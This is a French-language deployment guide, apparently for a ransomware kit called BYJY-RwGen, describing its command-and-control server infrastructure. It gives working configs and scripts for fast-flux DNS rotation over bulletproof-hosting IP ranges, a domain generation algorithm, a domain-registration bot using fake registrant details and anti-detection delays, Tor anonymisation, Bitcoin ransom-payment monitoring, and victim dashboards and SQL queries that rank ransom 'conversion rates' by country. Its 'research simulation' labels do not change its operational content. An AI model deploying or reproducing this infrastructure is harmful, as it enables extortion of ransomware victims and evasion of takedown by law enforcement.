# 🎛️ BYJY-RwGen - Guide Complet Configuration Serveur C&C

**Version**: 2024.Q2  
**Type**: Infrastructure Command & Control Complète  
**Niveau**: Production-Ready Enterprise Grade  

---

## 🏗️ ARCHITECTURE SERVEUR C&C

### **Configuration Multi-Serveurs Recommandée**

```
🌐 INFRASTRUCTURE DISTRIBUTION TYPIQUE

Tier 1 - Serveurs Frontend (3-5 serveurs)
├── Load Balancer/Proxy Inverse
├── Domaines Fast-Flux (50+ domaines rotatifs)
├── CDN Integration (CloudFlare, AWS CloudFront)
└── Geographic Distribution (US, EU, ASIA)

Tier 2 - Serveurs C&C Core (2-3 serveurs)  
├── Application Server (PHP/Nginx/Apache)
├── Base de Données (SQLite/MySQL répliquée)
├── Payment Monitor (Bitcoin APIs)
└── Decryptor Generation Engine

Tier 3 - Serveurs Backend (2-4 serveurs)
├── Bitcoin Full Nodes (vérification indépendante)
├── DNS Authoritative Servers
├── File Storage (décrypteurs générés)
└── Log Processing & Analytics

Tier 4 - Infrastructure Support (1-2 serveurs)
├── VPN/Proxy Management
├── Domain Registration Bot
├── SSL Certificate Management  
└── Backup & Recovery Systems
```

---

## ⚙️ CONFIGURATION SERVEUR PRINCIPAL

### **A. Configuration Système de Base**

```bash
# 1. SPÉCIFICATIONS MATÉRIELLES RECOMMANDÉES
CPU: 8+ cores (Intel Xeon ou AMD EPYC)
RAM: 32+ GB DDR4
SSD: 1TB+ NVMe (haute performance I/O)
Network: 1Gbps+ avec faible latence
OS: Ubuntu 20.04 LTS ou Debian 11

# 2. INSTALLATION DÉPENDANCES SYSTÈME
apt update && apt upgrade -y
apt install -y nginx php8.1-fpm php8.1-sqlite3 php8.1-curl php8.1-json \
               php8.1-gd php8.1-mbstring php8.1-xml sqlite3 \
               build-essential cmake git curl wget unzip \
               certbot python3-certbot-nginx

# 3. CONFIGURATION NGINX (High Performance)
cat > /etc/nginx/sites-available/c2-server << 'EOF'
server {
    listen 80;
    listen 443 ssl http2;
    server_name *.example.com;  # Wildcard pour fast-flux
    root /var/www/html;
    index index.php;
    
    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    # Security Headers
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
    
    # Rate Limiting
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req zone=api burst=20 nodelay;
    
    # API Routes
    location /api/ {
        try_files $uri $uri/ /index.php?$query_string;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
    
    # Static Files (Decryptors)
    location /decryptors/ {
        internal;
        alias /var/www/secure_downloads/;
        add_header Content-Disposition 'attachment';
    }
    
    # Block Common Attack Patterns
    location ~ /\.ht { deny all; }
    location ~ /\.git { deny all; }
    location ~ /\.env { deny all; }
}
EOF

ln -s /etc/nginx/sites-available/c2-server /etc/nginx/sites-enabled/
systemctl restart nginx
```

### **B. Configuration PHP Optimisée**

```bash
# Configuration PHP pour haute performance
cat > /etc/php/8.1/fpm/pool.d/c2-pool.conf << 'EOF'
[c2-server]
user = www-data
group = www-data
listen = /var/run/php/php8.1-fpm-c2.sock
listen.owner = www-data
listen.group = www-data
listen.mode = 0666

pm = dynamic
pm.max_children = 50
pm.start_servers = 10
pm.min_spare_servers = 5
pm.max_spare_servers = 20
pm.max_requests = 1000

php_admin_value[memory_limit] = 512M
php_admin_value[max_execution_time] = 300
php_admin_value[upload_max_filesize] = 100M
php_admin_value[post_max_size] = 100M
php_admin_value[max_file_uploads] = 50

# Security
php_admin_flag[expose_php] = off
php_admin_value[disable_functions] = exec,passthru,shell_exec,system,proc_open,popen
php_admin_value[open_basedir] = /var/www/html:/tmp
EOF

systemctl restart php8.1-fpm
```

---

## 🔐 CONFIGURATION SÉCURITÉ AVANCÉE

### **A. Firewall et Protection DDoS**

```bash
# 1. CONFIGURATION UFW (Ubuntu Firewall)
ufw --force reset
ufw default deny incoming
ufw default allow outgoing

# Autoriser services essentiels
ufw allow ssh
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 53/tcp    # DNS
ufw allow 53/udp    # DNS

# Rate limiting pour SSH
ufw limit ssh

# Bloquer pays non-autorisés (exemple)
# Utiliser GeoIP ou services similaires

ufw --force enable

# 2. CONFIGURATION FAIL2BAN
apt install -y fail2ban

cat > /etc/fail2ban/jail.local << 'EOF'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3
backend = systemd

[sshd]
enabled = true

[nginx-http-auth]
enabled = true

[nginx-limit-req]
enabled = true
filter = nginx-limit-req
logpath = /var/log/nginx/error.log
maxretry = 10

[nginx-noscript]
enabled = true
filter = nginx-noscript
logpath = /var/log/nginx/access.log
maxretry = 6

[nginx-badbots]
enabled = true
filter = nginx-badbots
logpath = /var/log/nginx/access.log
maxretry = 2
EOF

systemctl enable fail2ban
systemctl start fail2ban
```

### **B. Chiffrement et Certificats SSL**

```bash
# 1. GÉNÉRATION CERTIFICATS WILDCARD
certbot certonly --nginx -d example.com -d *.example.com \
                  --agree-tos --email admin@example.com

# 2. CONFIGURATION AUTO-RENEWAL
crontab -e
# Ajouter: 0 0 1 * * certbot renew --quiet && systemctl reload nginx

# 3. SSL HARDENING
openssl dhparam -out /etc/ssl/certs/dhparam.pem 4096

# Ajouter dans nginx:
# ssl_dhparam /etc/ssl/certs/dhparam.pem;
# ssl_ecdh_curve secp384r1;
```

---

## 🌐 CONFIGURATION FAST-FLUX DNS

### **A. Gestion Domaines Automatisée**

```bash
# Script de gestion Fast-Flux
cat > /opt/fast-flux-manager.sh << 'EOF'
#!/bin/bash

DOMAIN_POOL="/opt/domains.txt"
CURRENT_DOMAINS="/opt/current_domains.txt"
DNS_PROVIDER_API="https://api.cloudflare.com/client/v4"
CF_TOKEN="your_cloudflare_token"
ZONE_ID="your_zone_id"

# Fonction rotation domaines
rotate_domains() {
    echo "[$(date)] Starting domain rotation"
    
    # Sélectionner 10 nouveaux domaines aléatoires
    shuf -n 10 $DOMAIN_POOL > $CURRENT_DOMAINS
    
    # Mettre à jour DNS records
    while read domain; do
        # Obtenir nouvelle IP du pool
        NEW_IP=$(get_random_ip)
        
        # Mettre à jour via API Cloudflare
        curl -X PUT "${DNS_PROVIDER_API}/zones/${ZONE_ID}/dns_records" \
             -H "Authorization: Bearer ${CF_TOKEN}" \
             -H "Content-Type: application/json" \
             --data "{
                 \"type\":\"A\",
                 \"name\":\"${domain}\",
                 \"content\":\"${NEW_IP}\",
                 \"ttl\":60
             }"
        
        echo "Updated $domain -> $NEW_IP"
        sleep 5  # Rate limiting
    done < $CURRENT_DOMAINS
}

# Fonction génération IP aléatoire (bulletproof hosting)
get_random_ip() {
    # Pool IPs bulletproof hosting (exemple simulé)
    IP_POOLS=(
        "185.220.100"
        "185.221.200" 
        "194.180.150"
        "91.245.180"
        "37.139.160"
    )
    
    BASE_IP=${IP_POOLS[$RANDOM % ${#IP_POOLS[@]}]}
    FINAL_OCTET=$((RANDOM % 254 + 1))
    echo "${BASE_IP}.${FINAL_OCTET}"
}

# Exécution rotation si appelé directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    rotate_domains
fi
EOF

chmod +x /opt/fast-flux-manager.sh

# Automatisation via cron (rotation toutes les heures)
echo "0 * * * * root /opt/fast-flux-manager.sh" >> /etc/crontab
```

### **B. Configuration DNS Autoritaire**

```bash
# Installation BIND9 pour serveur DNS autoritaire
apt install -y bind9 bind9utils bind9-doc

# Configuration zone DNS dynamique
cat > /etc/bind/named.conf.local << 'EOF'
zone "example.com" {
    type master;
    file "/var/lib/bind/db.example.com";
    allow-update { 127.0.0.1; };
    also-notify { 
        8.8.8.8;          # Secondaires DNS
        1.1.1.1;
    };
};
EOF

# Template zone file avec TTL bas
cat > /var/lib/bind/db.example.com << 'EOF'
$ORIGIN example.com.
$TTL 60

@ IN SOA ns1.example.com. admin.example.com. (
    2024010101  ; serial
    3600        ; refresh
    1800        ; retry  
    604800      ; expire
    60          ; minimum TTL
)

; Name servers
@               IN  NS      ns1.example.com.
@               IN  NS      ns2.example.com.

; A records (mis à jour automatiquement)
ns1             IN  A       YOUR_PRIMARY_IP
ns2             IN  A       YOUR_SECONDARY_IP
*               IN  A       YOUR_DEFAULT_IP

; Fast-flux wildcard
*.cdn           IN  A       ROTATING_IP_1
*.api           IN  A       ROTATING_IP_2
*.static        IN  A       ROTATING_IP_3
EOF

systemctl restart bind9
```

---

## 💰 CONFIGURATION MONITORING BITCOIN

### **A. Configuration Multi-API Bitcoin**

```php
// Configuration avancée Bitcoin APIs
<?php
// /app/c2_server/bitcoin_config.php

return [
    'primary_apis' => [
        'blockstream' => [
            'base_url' => 'https://blockstream.info/api',
            'rate_limit' => 10, // requests per minute
            'timeout' => 30,
            'priority' => 1
        ],
        'blockchain_info' => [
            'base_url' => 'https://blockchain.info/rawaddr',
            'rate_limit' => 5,
            'timeout' => 20,
            'priority' => 2
        ],
        'blockcypher' => [
            'base_url' => 'https://api.blockcypher.com/v1/btc/main',
            'api_key' => 'YOUR_BLOCKCYPHER_TOKEN',
            'rate_limit' => 200, // avec API key
            'timeout' => 25,
            'priority' => 3
        ]
    ],
    
    'backup_apis' => [
        'btc_com' => [
            'base_url' => 'https://chain.api.btc.com/v3',
            'timeout' => 30
        ],
        'coinbase' => [
            'base_url' => 'https://api.coinbase.com/v2',
            'timeout' => 20
        ]
    ],
    
    'monitoring' => [
        'check_interval' => 300,        // 5 minutes
        'confirmation_required' => 1,   // minimum confirmations
        'max_check_age' => 172800,     // 48 hours
        'parallel_checks' => true,      // vérification simultanée
        'redundancy_level' => 2         // 2/3 APIs doivent confirmer
    ],
    
    'wallets' => [
        'generation_method' => 'hierarchical_deterministic',
        'master_seed' => 'YOUR_SECURE_MASTER_SEED',
        'derivation_path' => "m/44'/0'/0'/0",
        'gap_limit' => 20,
        'address_reuse' => false
    ]
];
?>
```

### **B. Script Monitoring Avancé**

```bash
# Service systemd pour monitoring Bitcoin
cat > /etc/systemd/system/bitcoin-monitor.service << 'EOF'
[Unit]
Description=Bitcoin Payment Monitor
After=network.target mysql.service
Wants=network-online.target

[Service]
Type=simple
User=www-data
Group=www-data
WorkingDirectory=/var/www/html/c2_server
ExecStart=/usr/bin/php payment_monitor.php
Restart=always
RestartSec=30
StandardOutput=journal
StandardError=journal

# Resource limits
MemoryLimit=1G
CPUQuota=50%

# Security
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/www/html/c2_server /tmp

[Install]
WantedBy=multi-user.target
EOF

systemctl enable bitcoin-monitor.service
systemctl start bitcoin-monitor.service
```

---

## 🔧 OBTENTION ET GESTION DES DOMAINES

### **A. Stratégies d'Acquisition de Domaines**

```bash
# 1. DOMAINES LÉGITIMES EXPIRÉS
# Script automatisé recherche domaines expirés
cat > /opt/expired_domains_scout.py << 'EOF'
#!/usr/bin/env python3
import requests
import time
import random

class ExpiredDomainScout:
    def __init__(self):
        self.sources = [
            'https://www.expireddomains.net/backorder-expired-domains/',
            'https://www.freshdrop.com/',
            'https://www.godaddy.com/domain-auctions'
        ]
    
    def find_suitable_domains(self, count=50):
        """
        Recherche domaines expirés avec:
        - Historique légitime (pas de blacklist)
        - Extensions communes (.com, .net, .org)
        - Noms générique/neutres
        - Age > 1 an (crédibilité SEO)
        """
        suitable_domains = []
        
        # Critères de sélection
        good_keywords = [
            'service', 'system', 'solution', 'tech', 'digital',
            'cloud', 'network', 'platform', 'media', 'data'
        ]
        
        bad_keywords = [
            'porn', 'adult', 'casino', 'gambling', 'drugs',
            'hack', 'crack', 'warez', 'torrent', 'illegal'
        ]
        
        # Simulation recherche (remplacer par vraie API)
        for i in range(count):
            domain = self.generate_legitimate_domain()
            if self.check_domain_suitability(domain):
                suitable_domains.append(domain)
        
        return suitable_domains
    
    def generate_legitimate_domain(self):
        prefixes = ['secure', 'pro', 'expert', 'smart', 'quick']
        suffixes = ['solutions', 'systems', 'services', 'tech', 'platform']
        tlds = ['.com', '.net', '.org', '.info']
        
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        tld = random.choice(tlds)
        
        return f"{prefix}-{suffix}{tld}"
    
    def check_domain_suitability(self, domain):
        """Vérification réputation domaine"""
        # Vérifications à implémenter:
        # - VirusTotal API
        # - Google Safe Browsing
        # - Spamhaus SBL
        # - MX Toolbox Blacklist
        return True  # Simulation

if __name__ == "__main__":
    scout = ExpiredDomainScout()
    domains = scout.find_suitable_domains(50)
    
    with open('/opt/candidate_domains.txt', 'w') as f:
        for domain in domains:
            f.write(domain + '\n')
    
    print(f"Found {len(domains)} suitable domains")
EOF

# 2. GÉNÉRATION ALGORITHMIQUE DOMAINES
cat > /opt/dga_domains.py << 'EOF'
#!/usr/bin/env python3
import hashlib
from datetime import datetime, timedelta

class DomainGenerationAlgorithm:
    def __init__(self, seed="research_seed_2024"):
        self.seed = seed
        self.tlds = ['.com', '.net', '.org', '.info', '.biz']
        
    def generate_daily_domains(self, date=None, count=20):
        """Génère domaines pour une date donnée"""
        if not date:
            date = datetime.now().strftime('%Y-%m-%d')
        
        # Hash seed + date pour reproductibilité
        hash_input = f"{self.seed}_{date}"
        hash_digest = hashlib.sha256(hash_input.encode()).hexdigest()
        
        domains = []
        for i in range(count):
            # Extraire chunk du hash
            start_pos = (i * 3) % len(hash_digest)
            chunk = hash_digest[start_pos:start_pos + 12]
            
            # Convertir en nom de domaine
            domain_name = ""
            for j in range(0, 12, 2):
                hex_pair = chunk[j:j+2]
                char_code = int(hex_pair, 16) % 26
                domain_name += chr(ord('a') + char_code)
            
            # Limiter longueur et ajouter TLD
            domain_name = domain_name[:8]
            tld = self.tlds[i % len(self.tlds)]
            domains.append(domain_name + tld)
        
        return domains
    
    def generate_weekly_pool(self):
        """Génère pool domaines pour la semaine"""
        all_domains = []
        
        for i in range(7):  # 7 jours
            date = (datetime.now() + timedelta(days=i)).strftime('%Y-%m-%d')
            daily_domains = self.generate_daily_domains(date)
            all_domains.extend(daily_domains)
        
        return all_domains

if __name__ == "__main__":
    dga = DomainGenerationAlgorithm()
    
    # Domaines aujourd'hui
    today_domains = dga.generate_daily_domains()
    print("Today's DGA domains:")
    for domain in today_domains[:10]:
        print(f"  - {domain}")
    
    # Pool semaine
    week_pool = dga.generate_weekly_pool()
    print(f"\nWeek pool: {len(week_pool)} domains")
EOF
```

### **B. Enregistrement Automatisé Domaines**

```python
#!/usr/bin/env python3
# /opt/domain_registration_bot.py

import requests
import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By

class DomainRegistrationBot:
    def __init__(self):
        self.registrars = [
            {
                'name': 'namecheap',
                'api_endpoint': 'https://api.namecheap.com/xml.response',
                'api_key': 'YOUR_NAMECHEAP_API_KEY',
                'username': 'YOUR_USERNAME'
            },
            {
                'name': 'godaddy',
                'api_endpoint': 'https://api.godaddy.com/v1',
                'api_key': 'YOUR_GODADDY_API_KEY',
                'secret': 'YOUR_GODADDY_SECRET'
            }
        ]
        
        # Informations anonymes pour enregistrement
        self.fake_registrant = {
            'first_name': 'John',
            'last_name': 'Smith',
            'organization': 'Tech Solutions LLC',
            'email': 'contact@protonmail.com',
            'phone': '+1.5551234567',
            'address': '123 Main St',
            'city': 'New York',
            'state': 'NY',
            'postal_code': '10001',
            'country': 'US'
        }
    
    def register_domain_batch(self, domains, registrar='namecheap'):
        """Enregistrement domaines par lot"""
        successful_registrations = []
        failed_registrations = []
        
        for domain in domains:
            try:
                # Vérifier disponibilité
                if self.check_availability(domain, registrar):
                    # Tentative enregistrement
                    if self.register_single_domain(domain, registrar):
                        successful_registrations.append(domain)
                        print(f"✓ Registered: {domain}")
                    else:
                        failed_registrations.append(domain)
                        print(f"✗ Failed: {domain}")
                else:
                    print(f"⚠ Unavailable: {domain}")
                
                # Délai anti-détection
                time.sleep(random.uniform(10, 30))
                
            except Exception as e:
                print(f"✗ Error with {domain}: {e}")
                failed_registrations.append(domain)
        
        return successful_registrations, failed_registrations
    
    def check_availability(self, domain, registrar):
        """Vérifier disponibilité domaine"""
        if registrar == 'namecheap':
            # API Namecheap
            params = {
                'ApiUser': self.registrars[0]['username'],
                'ApiKey': self.registrars[0]['api_key'],
                'UserName': self.registrars[0]['username'],
                'Command': 'namecheap.domains.check',
                'DomainList': domain
            }
            
            response = requests.get(self.registrars[0]['api_endpoint'], params=params)
            # Parser XML response...
            return 'Available="true"' in response.text
        
        return False
    
    def register_single_domain(self, domain, registrar):
        """Enregistrer domaine unique"""
        if registrar == 'namecheap':
            params = {
                'ApiUser': self.registrars[0]['username'],
                'ApiKey': self.registrars[0]['api_key'],
                'UserName': self.registrars[0]['username'],
                'Command': 'namecheap.domains.create',
                'DomainName': domain,
                'Years': '1',
                # Ajouter infos registrant...
            }
            
            response = requests.post(self.registrars[0]['api_endpoint'], data=params)
            return response.status_code == 200
        
        return False
    
    def setup_privacy_protection(self, domain):
        """Activer protection WHOIS"""
        # Implémentation protection vie privée
        pass
    
    def configure_dns_records(self, domain, target_ip):
        """Configuration initiale DNS"""
        # Configurer A records vers serveurs C&C
        pass

if __name__ == "__main__":
    bot = DomainRegistrationBot()
    
    # Charger liste domaines candidats
    with open('/opt/candidate_domains.txt', 'r') as f:
        domains = [line.strip() for line in f.readlines()]
    
    # Enregistrer domaines
    success, failed = bot.register_domain_batch(domains[:10])
    
    print(f"\nRegistration Summary:")
    print(f"Successful: {len(success)}")
    print(f"Failed: {len(failed)}")
```

---

## 🔍 HOSTING BULLETPROOF ET ANONYME

### **A. Critères Sélection Hébergement**

```yaml
# Caractéristiques Hébergement Bulletproof (Simulation Recherche)
bulletproof_hosting_criteria:
  
  legal_protection:
    - "Juridictions permissives (offshore)"
    - "Pas de cooperation avec law enforcement"
    - "Lois copyright/DMCA laxistes" 
    - "Protection données clients stricte"
  
  technical_features:
    - "Paiement Bitcoin/Crypto accepté"
    - "Setup anonyme (pas KYC)"
    - "DDoS protection incluse"
    - "Bande passante illimitée"
    - "Multiple datacenters"
    - "Uptime 99.9%+"
  
  anonymity_features:
    - "Enregistrement via Tor supporté"
    - "Pas logs connexions"
    - "Communications chiffrées uniquement"
    - "Support ticket anonyme"
    - "Proxy/VPN friendly"
  
  red_flags_avoid:
    - "Demande documents d'identité"
    - "Politique cooperation law enforcement"
    - "Logs détaillés conservés"
    - "Historique takedowns fréquents"
    - "Surveillance gouvernementale connue"

# Simulation Fournisseurs (RECHERCHE UNIQUEMENT)
simulated_providers:
  
  provider_a:
    name: "Research-Host-Alpha"
    country: "Country-A"
    features: ["Bitcoin", "NoKYC", "DDoS-Protection"]
    ip_ranges: ["185.220.0.0/16", "194.180.0.0/16"]
    price_range: "$50-200/month"
    setup_time: "instant"
    support: "encrypted_only"
  
  provider_b:
    name: "Research-Host-Beta" 
    country: "Country-B"
    features: ["Offshore", "No-Logs", "Tor-Friendly"]
    ip_ranges: ["91.245.0.0/16", "37.139.0.0/16"]
    price_range: "$80-300/month"
    setup_time: "<24h"
    support: "ticket_system"
    
  provider_c:
    name: "Research-Host-Gamma"
    country: "Country-C"
    features: ["Multi-Location", "API-Access", "High-Uptime"]
    ip_ranges: ["185.221.0.0/16", "194.181.0.0/16"]
    price_range: "$100-500/month"
    setup_time: "instant"
    support: "24/7_chat"
```

### **B. Configuration Serveur Anonyme**

```bash
# Configuration serveur avec anonymat maximal
# (SIMULATION RECHERCHE - Ne pas utiliser en production)

# 1. INSTALLATION VIA TOR
echo "deb tor+https://deb.debian.org/debian bullseye main" >> /etc/apt/sources.list
apt update

# 2. CONFIGURATION RÉSEAU ANONYME
cat > /etc/systemd/network/10-anonymous.network << 'EOF'
[Match]
Name=eth0

[Network]
DHCP=no
Address=YOUR_ASSIGNED_IP/24
Gateway=YOUR_GATEWAY
DNS=1.1.1.1
DNS=8.8.8.8

# IPv6 disabled pour anonymat
IPv6AcceptRA=no
LinkLocalAddressing=no
EOF

# 3. TOR PROXY POUR COMMUNICATIONS SORTANTES
apt install -y tor obfs4proxy
cat > /etc/tor/torrc << 'EOF'
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
CookieAuthFileGroupReadable 1

# Bridges pour contournement
UseBridges 1
Bridge obfs4 [IP]:[PORT] [FINGERPRINT]
ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy

# Sécurité
AvoidDiskWrites 1
HardwareAccel 1
NumEntryGuards 8
EOF

systemctl enable tor
systemctl start tor

# 4. PROXY TRANSPARENT POUR APPLICATIONS
iptables -t nat -A OUTPUT -p tcp --dport 80,443 -j REDIRECT --to-port 9040
iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-port 5353

# 5. LOGS ANONYMISÉS
cat > /etc/rsyslog.d/50-anonymous.conf << 'EOF'
# Anonymiser logs - remplacer IPs par hashes
:msg, regex, "([0-9]{1,3}\.){3}[0-9]{1,3}" {
    /var/log/anonymous.log
    stop
}
EOF

systemctl restart rsyslog
```

---

## 🛡️ MONITORING ET SÉCURITÉ OPÉRATIONNELLE

### **A. Système de Surveillance Avancé**

```bash
# Installation stack monitoring
apt install -y prometheus grafana-server node-exporter nginx-prometheus-exporter

# Configuration Prometheus
cat > /etc/prometheus/prometheus.yml << 'EOF'
global:
  scrape_interval: 15s
  evaluation_interval: 15s

alerting:
  alertmanagers:
    - static_configs:
        - targets:
          - alertmanager:9093

rule_files:
  - "c2_alerts.yml"

scrape_configs:
  - job_name: 'c2-server'
    static_configs:
      - targets: ['localhost:9100', 'localhost:9113']
    
  - job_name: 'nginx'
    static_configs:
      - targets: ['localhost:9113']
    
  - job_name: 'bitcoin-monitor'
    static_configs:
      - targets: ['localhost:8080']
    scrape_interval: 60s
EOF

# Alertes critiques
cat > /etc/prometheus/c2_alerts.yml << 'EOF'
groups:
- name: c2_server
  rules:
  
  # Serveur down
  - alert: ServerDown
    expr: up == 0
    for: 1m
    labels:
      severity: critical
    annotations:
      summary: "C&C Server is down"
      description: "Server has been down for more than 1 minute"
  
  # Charge CPU élevée
  - alert: HighCPU
    expr: 100 - (avg by(instance) (rate(node_cpu_seconds_total{mode="idle"}[2m])) * 100) > 80
    for: 5m
    labels:
      severity: warning
    annotations:
      summary: "High CPU usage detected"
      description: "CPU usage is above 80% for more than 5 minutes"
  
  # Espace disque faible
  - alert: LowDiskSpace
    expr: node_filesystem_avail_bytes{mountpoint="/"} / node_filesystem_size_bytes{mountpoint="/"} < 0.1
    for: 2m
    labels:
      severity: critical
    annotations:
      summary: "Low disk space"
      description: "Less than 10% disk space remaining"
  
  # Bitcoin API failures
  - alert: BitcoinAPIFailures
    expr: rate(bitcoin_api_failures_total[5m]) > 0.1
    for: 3m
    labels:
      severity: warning
    annotations:
      summary: "Bitcoin API failures detected"
      description: "High rate of Bitcoin API failures"
  
  # Trop de tentatives de connexion
  - alert: HighLoginAttempts
    expr: rate(nginx_http_requests_total{status="401"}[5m]) > 5
    for: 2m
    labels:
      severity: warning
    annotations:
      summary: "High number of login attempts"
      description: "Potential brute force attack detected"
EOF

systemctl enable prometheus
systemctl start prometheus
```

### **B. Dashboard Grafana Personnalisé**

```json
{
  "dashboard": {
    "title": "C&C Server Monitoring",
    "panels": [
      {
        "title": "Active Victims",
        "type": "stat",
        "targets": [
          {
            "expr": "c2_active_victims_total",
            "legendFormat": "Active Victims"
          }
        ]
      },
      {
        "title": "Payment Success Rate",
        "type": "gauge",
        "targets": [
          {
            "expr": "c2_payment_success_rate",
            "legendFormat": "Success Rate %"
          }
        ]
      },
      {
        "title": "Bitcoin API Response Times",
        "type": "graph",
        "targets": [
          {
            "expr": "histogram_quantile(0.95, rate(bitcoin_api_duration_seconds_bucket[5m]))",
            "legendFormat": "95th percentile"
          }
        ]
      },
      {
        "title": "Domain Rotation Status",
        "type": "table",
        "targets": [
          {
            "expr": "c2_domain_status",
            "legendFormat": "{{domain}} - {{status}}"
          }
        ]
      }
    ]
  }
}
```

---

## 📊 MÉTRIQUES ET ANALYTICS

### **A. KPIs Opérationnels Critiques**

```sql
-- Requêtes analytics SQL pour monitoring

-- 1. Taux de conversion paiement par pays
SELECT 
    v.country,
    COUNT(*) as total_victims,
    COUNT(CASE WHEN p.payment_received = 1 THEN 1 END) as paid_victims,
    ROUND(COUNT(CASE WHEN p.payment_received = 1 THEN 1 END) * 100.0 / COUNT(*), 2) as conversion_rate
FROM victims v
LEFT JOIN payments p ON v.victim_id = p.victim_id
GROUP BY v.country
ORDER BY conversion_rate DESC;

-- 2. Performance décryptage par algoritme
SELECT 
    ds.victim_id,
    JSON_EXTRACT(ds.metadata, '$.files_decrypted') as files_decrypted,
    JSON_EXTRACT(ds.metadata, '$.files_failed') as files_failed,
    JSON_EXTRACT(ds.metadata, '$.decryption_time') as decryption_time,
    ROUND(JSON_EXTRACT(ds.metadata, '$.files_decrypted') * 100.0 / 
          (JSON_EXTRACT(ds.metadata, '$.files_decrypted') + JSON_EXTRACT(ds.metadata, '$.files_failed')), 2) as success_rate
FROM decryption_status ds 
WHERE ds.status = 'decryption_completed'
ORDER BY success_rate DESC;

-- 3. Analyse temporelle paiements
SELECT 
    DATE(v.first_seen) as infection_date,
    AVG((julianday(p.received_at) - julianday(v.first_seen)) * 24) as avg_payment_time_hours,
    COUNT(*) as total_infections,
    COUNT(CASE WHEN p.payment_received = 1 THEN 1 END) as payments_received
FROM victims v
LEFT JOIN payments p ON v.victim_id = p.victim_id
GROUP BY DATE(v.first_seen)
ORDER BY infection_date DESC;

-- 4. Efficacité canaux C&C
SELECT 
    v.status,
    COUNT(*) as victim_count,
    AVG((julianday('now') - julianday(v.last_heartbeat)) * 24) as avg_hours_since_last_contact
FROM victims v
GROUP BY v.status;
```

### **B. Alertes Automatisées**

```bash
# Script d'alertes critiques
cat > /opt/c2_alerts.sh << 'EOF'
#!/bin/bash

DB_PATH="/var/www/html/c2_server/research_c2.db"
ALERT_WEBHOOK="https://hooks.slack.com/your/webhook/url"
CRITICAL_THRESHOLD_VICTIMS=100
WARNING_PAYMENT_RATE=50

# Fonction envoi alerte
send_alert() {
    local severity=$1
    local message=$2
    
    curl -X POST $ALERT_WEBHOOK \
         -H 'Content-type: application/json' \
         --data "{
             \"text\": \"🚨 C&C Alert [$severity]: $message\",
             \"username\": \"C&C Monitor\",
             \"icon_emoji\": \":warning:\"
         }"
}

# Vérifier nombre de victimes actives
active_victims=$(sqlite3 $DB_PATH "SELECT COUNT(*) FROM victims WHERE status='active' AND last_heartbeat > datetime('now', '-30 minutes');")

if [ $active_victims -gt $CRITICAL_THRESHOLD_VICTIMS ]; then
    send_alert "CRITICAL" "High victim count detected: $active_victims active victims"
fi

# Vérifier taux de paiement
payment_rate=$(sqlite3 $DB_PATH "SELECT ROUND(COUNT(CASE WHEN payment_received=1 THEN 1 END) * 100.0 / COUNT(*), 2) FROM payments;")

if [ $(echo "$payment_rate < $WARNING_PAYMENT_RATE" | bc) -eq 1 ]; then
    send_alert "WARNING" "Low payment rate detected: ${payment_rate}%"
fi

# Vérifier Bitcoin APIs
bitcoin_api_status=$(curl -s -o /dev/null -w "%{http_code}" "https://blockstream.info/api/blocks/tip/height")

if [ "$bitcoin_api_status" != "200" ]; then
    send_alert "WARNING" "Bitcoin API connectivity issues detected"
fi

# Vérifier espace disque décrypteurs
decryptor_disk=$(df /tmp/decryptors | tail -1 | awk '{print $5}' | sed 's/%//')

if [ $decryptor_disk -gt 90 ]; then
    send_alert "CRITICAL" "Decryptor storage nearly full: ${decryptor_disk}% used"
fi

echo "[$(date)] Alert checks completed"
EOF

chmod +x /opt/c2_alerts.sh

# Automatisation toutes les 10 minutes
echo "*/10 * * * * root /opt/c2_alerts.sh" >> /etc/crontab
```

---

## 🔄 MAINTENANCE ET MISE À JOUR

### **A. Procédures Backup Automatisées**

```bash
# Script backup complet C&C
cat > /opt/backup_c2.sh << 'EOF'
#!/bin/bash

BACKUP_DIR="/opt/backups"
DATE=$(date +%Y%m%d_%H%M%S)
C2_DIR="/var/www/html/c2_server"
DB_FILE="$C2_DIR/research_c2.db"

mkdir -p $BACKUP_DIR

# Backup base de données
sqlite3 $DB_FILE ".backup $BACKUP_DIR/c2_database_$DATE.db"

# Backup configuration files
tar -czf $BACKUP_DIR/c2_configs_$DATE.tar.gz \
    /etc/nginx/sites-available/c2-server \
    /etc/php/8.1/fpm/pool.d/c2-pool.conf \
    /opt/fast-flux-manager.sh \
    /opt/domain_registration_bot.py \
    $C2_DIR/*.php \
    $C2_DIR/api/

# Backup decryptors
if [ -d "/tmp/decryptors" ]; then
    tar -czf $BACKUP_DIR/decryptors_$DATE.tar.gz /tmp/decryptors/
fi

# Chiffrer backups
for file in $BACKUP_DIR/*_$DATE.*; do
    gpg --cipher-algo AES256 --compress-algo 1 --symmetric --output "$file.gpg" "$file"
    rm "$file"
done

# Rotation backups (garder 7 jours)
find $BACKUP_DIR -name "*.gpg" -mtime +7 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /opt/backup_c2.sh

# Backup quotidien 2h du matin
echo "0 2 * * * root /opt/backup_c2.sh" >> /etc/crontab
```

### **B. Mise à Jour Sécurité Automatique**

```bash
# Configuration unattended-upgrades
apt install -y unattended-upgrades apt-listchanges

cat > /etc/apt/apt.conf.d/50unattended-upgrades << 'EOF'
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}-security";
